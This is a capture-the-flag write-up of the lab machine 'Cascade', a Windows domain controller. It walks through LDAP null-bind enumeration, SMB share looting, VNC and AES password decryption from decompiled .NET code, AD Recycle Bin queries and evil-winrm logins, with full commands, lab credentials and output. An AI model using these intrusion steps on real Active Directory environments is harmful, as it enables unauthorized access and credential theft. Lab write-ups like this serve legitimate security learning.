---
layout: post
title: "Hack The Box: Cascade"
date: 2020-04-20
---

![machine profile](/writeups/assets/images/htb_cascade_profile.png)

**Summary:**
- User enumeration through `msrpc`
- using LDAP server NULL bind we recover a legacy password for r.thompson.
- Login to SMB as r.thompson and find a leftover VNC install from s.smith which we decrypt.
- Connect over SMB as s.smith to `audit$`.
- Find a an executable and a database containing LDAP credentials.
- Disassemble the application to decrypt the password for `ArkSvc` in the database.
- Connect over `wsman` as `ArkSvc` then perform a NULL base search to dump the deleted `TempAdmin` account credentials.
- Exploit password reuse to login as `Administrator`.

**Introduction:**
Cascade had a heavy emphasis on enumeration, and LDAP which was unlike the other active Windows boxes at the time. Prior to this box, I had never touched LDAP before which made it a brilliant learning opportunity. Gaining user was straightforward but took a while since I attempted to exhaust all routes on other services. Rooting Cascade was trickier and involved a few more steps but these felt natural. Onto the box.

**Setup:**
Add the box IP to our `/etc/hosts` file.

```console
$ printf "10.10.10.182\tcascade.htb\n" >> /etc/hosts
```

**Enumeration #1:**
Perform detailed portscan on the lower ports of `cascade.htb` using `nmap` to gather information on any exposed services. Then, perform a less resolute portscan to identify any open higher ports.

```console
$ sudo nmap -sC -sV -Pn cascade.htb -oA nmap/initial; sleep 300 && \
    sudo nmap -p- -sS -Pn cascade.htb -oA nmap/all-ports
$ cat nmap/initial.nmap
Nmap scan report for cascade.htb (10.10.10.182)
Host is up (0.035s latency).
Not shown: 986 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 13m09s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-04-09T15:33:21
|_  start_date: 2020-04-09T12:57:01
```

If we look at port `389` and `3268` we see `nmap` gathered the domain of this box `cascade.local` - we add this to our hosts file entry as `cascade.htb`. At this point I spent a while enumerating all the services except LDAP - which I left last.

With a FQDN for AD we can attempt a [null bind LDAP query](https://securitysynapse.blogspot.com/2013/09/dangers-of-ldap-null-base-and-bind.html).

```console
$ ldapsearch -x -b "dc=cascade,dc=local" -H  ldap://cascade.local
[snip]
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
...
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
...
cascadeLegacyPwd: clk0bjVldmE=
[snip]
```

If we look at the last field, we see it is a base64 encoded legacy password for r.thompson.

```console
$ echo "clk0bjVldmE=" | base64 -d
rY4n5eva
```

As an additional note, the query returns information on all users but it is also possible to query `msrpc` with `rpcclient` to dump user account information.

**Enumeration #2:**
We can use r.thompson's credentials to finally enumerate SMB since Guest authentication is disabled.

```console
$ python smbmap.py -H cascade.local -u r.thompson -p rY4n5eva
[snip]
	.
	dr--r--r--                0 Tue Jan 28 22:05:51 2020	.
	dr--r--r--                0 Tue Jan 28 22:05:51 2020	..
	dr--r--r--                0 Mon Jan 13 01:45:14 2020	Contractors
	dr--r--r--                0 Mon Jan 13 01:45:10 2020	Finance
	dr--r--r--                0 Tue Jan 28 18:04:51 2020	IT
	dr--r--r--                0 Mon Jan 13 01:45:20 2020	Production
	dr--r--r--                0 Mon Jan 13 01:45:16 2020	Temps
	Data                                              	READ ONLY
[snip]
```

Next, we logon to SMB and inspect `IT`.

```console
$ smbclient //cascade.local/Data -U r.thompson
directory_create_or_exist: mkdir failed on directory /var/cache/samba/msg.lock: Permission denied
Unable to initialize messaging context
Enter WORKGROUP\r.thompson's password:
Try "help" to get a list of possible commands.
smb: \> cd IT
smb: \IT\> recurse on
smb: \IT\> prompt off
smb: \IT\> dir
  .                                   D        0  Tue Jan 28 18:04:51 2020
  ..                                  D        0  Tue Jan 28 18:04:51 2020
  Email Archives                      D        0  Tue Jan 28 18:00:30 2020
  LogonAudit                          D        0  Tue Jan 28 18:04:40 2020
  Logs                                D        0  Wed Jan 29 00:53:04 2020
  Temp                                D        0  Tue Jan 28 22:06:59 2020

...

\IT\Email Archives
  .                                   D        0  Tue Jan 28 18:00:30 2020
  ..                                  D        0  Tue Jan 28 18:00:30 2020
  Meeting_Notes_June_2018.html        A     2522  Tue Jan 28 18:00:12 2020

...

\IT\Temp\s.smith
  .                                   D        0  Tue Jan 28 20:00:01 2020
  ..                                  D        0  Tue Jan 28 20:00:01 2020
  VNC Install.reg                     A     2680  Tue Jan 28 19:27:44 2020

		13106687 blocks of size 4096. 7786636 blocks available
```

Inspect all the files available to us on SMB. Eventually, we find `\IT\Email Archives\Meeting_Notes_June_2018.html` which can be opened in a browser.

![Meeting notes](/writeups/assets/images/htb_cascade_email.png)

From this we obtain two important pieces of information:
- TempAdmin had (and possibly still has) the same credentials as the Administrator account.
- s.smith is the head of IT and may have elevated permissions to other IT users.

**User:**
We also find a `VNC Install.reg` from `\IT\Temp\s.smith`, if we inspect it we see find an encrypted password.

```console
$ cat 'VNC Install.reg'
[snip]
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
[snip]
```

This can be decrypted using [an online tool](https://github.com/jeroennijhof/vncpwd) to get `sT333ve2`. Finally, s.smith is able to remotely access `cascade.local` which we do over `wsman` using [evil-winrm](https://github.com/Hackplayers/evil-winrm).

```console
$ evil-winrm -P 5985 -u s.smith -p "sT333ve2" -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> dir ../Desktop/user.txt


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/20/2020   2:20 PM             34 user.txt
```

**Enumeration #3:**
We need to Return to SMB as s.smith. When enumerate SMB we see we have access to a drive r.thompson didn't.

```console
$ python smbmap.py -H cascade.local -u s.smith -p sT333ve2
[snip]
	.
	dr--r--r--                0 Wed Jan 29 18:01:26 2020	.
	dr--r--r--                0 Wed Jan 29 18:01:26 2020	..
	fr--r--r--            13312 Tue Jan 28 21:47:08 2020	CascAudit.exe
	fr--r--r--            12288 Wed Jan 29 18:01:26 2020	CascCrypto.dll
	dr--r--r--                0 Tue Jan 28 21:43:18 2020	DB
	fr--r--r--               45 Tue Jan 28 23:29:47 2020	RunAudit.bat
	fr--r--r--           363520 Tue Jan 28 20:42:18 2020	System.Data.SQLite.dll
	fr--r--r--           186880 Tue Jan 28 20:42:18 2020	System.Data.SQLite.EF6.dll
	dr--r--r--                0 Tue Jan 28 20:42:18 2020	x64
	dr--r--r--                0 Tue Jan 28 20:42:18 2020	x86
	Audit$                                            	READ ONLY
[snip]
```

**Lateral Movement:**
We download the contents of this drive and inspect it locally. We happen across a database file.

```console
$ file DB/Audit.db
DB/Audit.db: SQLite 3.x database, last written using SQLite version 3027002
```

With the knowledge that it is an sqlite3 database, we can inspect the tables.

```console
$ sqlite3
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open DB/Audit.db
sqlite> .tables
DeletedUserAudit  Ldap              Misc
sqlite> .schema Ldap
CREATE TABLE IF NOT EXISTS "Ldap" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"uname"	TEXT,
	"pwd"	TEXT,
	"domain"	TEXT
);
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

We appear to have credentials for ArkSvc but they're encrypted. I focused my attention to disassembling `CascAudit.exe` using [ILSpy](https://github.com/icsharpcode/ILSpy) since it likely decrypts these credentials.

```csharp
/* [snip] */
SQLiteCommand val2 = (SQLiteCommand)(object)new SQLiteCommand("SELECT * FROM LDAP", val);
try
{
    SQLiteDataReader val3 = val2.ExecuteReader();
    try
    {
        val3.Read();
        str = Conversions.ToString(val3.get_Item("Uname"));
        str2 = Conversions.ToString(val3.get_Item("Domain"));
        string encryptedString = Conversions.ToString(val3.get_Item("Pwd"));
        try
        {
            password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
        }
/* [snip] */
```

My suspicions were correct, this application does decrypt the credentials. However, I didn't have a Windows machine available for this box so I opted to compile the decompiled crypto DLL with the key given in the main application.

```csharp
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;


class MainClass {
  public static void Main (string[] args) {
    Console.WriteLine(DecryptString("BQO5l5Kj9MdErXx6Q6AGOw==", "c4scadek3y654321"));
  }

  public static string DecryptString(string EncryptedString, string Key) {
    byte[] array = Convert.FromBase64String(EncryptedString);
    Aes aes = Aes.Create();
    aes.KeySize = 128;
    aes.BlockSize = 128;
    aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
    aes.Mode = CipherMode.CBC;
    aes.Key = Encoding.UTF8.GetBytes(Key);
    using (MemoryStream stream = new MemoryStream(array))
    {
      using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read))
      {
        byte[] array2 = new byte[checked(array.Length - 1 + 1)];
        cryptoStream.Read(array2, 0, array2.Length);
        return Encoding.UTF8.GetString(array2);
      }
    }
  }
}
```

Running this gave us the decrypted password for ArkSvc.

```console
$ mcs -out:main.exe main.cs
$ mono main.exe
w3lc0meFr31nd
```

**Privilege Escalation:**
ArkSvc can access `cascade.local` using `evil-winrm`. Additionally, ArkSvc is able to access the `AD Recycle Bin` which may contain information about the TempAdmin account - which we can query to recover information.

```console
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isdeleted \
    -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
[snip]
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
[snip]
```

Decoding `cascadeLegacyPwd` gives us.

```console
$ echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
baCT3r1aN00dles
```

We can now logon to the box using `evil-winrm` once more, to grab the root flag.

```console
$ evil-winrm -P 5985 -u Administrator -p "baCT3r1aN00dles" -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop/root.txt


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/20/2020   2:20 PM             34 root.txt
```
